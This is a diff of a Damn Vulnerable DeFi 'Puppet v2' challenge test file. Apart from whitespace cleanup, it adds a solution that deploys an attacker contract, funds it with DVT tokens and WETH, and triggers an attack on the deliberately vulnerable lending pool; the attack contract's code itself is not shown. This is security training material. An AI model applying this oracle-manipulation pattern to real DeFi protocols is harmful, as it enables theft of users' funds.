@@ -20,7 +20,7 @@ describe('[Challenge] Puppet v2', function () {
     const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
         await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
@@ -29,7 +29,7 @@ describe('[Challenge] Puppet v2', function () {
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
         const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
-    
+
         // Deploy tokens to be traded
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
         weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();
@@ -39,7 +39,7 @@ describe('[Challenge] Puppet v2', function () {
         uniswapRouter = await UniswapRouterFactory.deploy(
             uniswapFactory.address,
             weth.address
-        );        
+        );
 
         // Create Uniswap pair against WETH and add liquidity
         await token.approve(
@@ -59,7 +59,7 @@ describe('[Challenge] Puppet v2', function () {
             await uniswapFactory.getPair(token.address, weth.address)
         );
         expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
-            
+
         // Deploy the lending pool
         lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
             weth.address,
@@ -83,6 +83,22 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('PuppetAttacker2', player)).deploy(
+            uniswapRouter.address,
+            token.address,
+            weth.address,
+            lendingPool.address
+        );
+
+        // Transfer player's DVT tokens to the attack contract
+        const initialAttackerBalance = await token.balanceOf(player.address);
+        await token.connect(player).transfer(attacker.address, initialAttackerBalance);
+        // Send weth to the attack contract
+        const value = ethers.utils.parseEther("19.9");
+        await weth.connect(player).deposit({ value: value });
+        await weth.connect(player).transfer(attacker.address, value);
+        // ATTACK
+        await attacker.attack();
     });
 
     after(async function () {
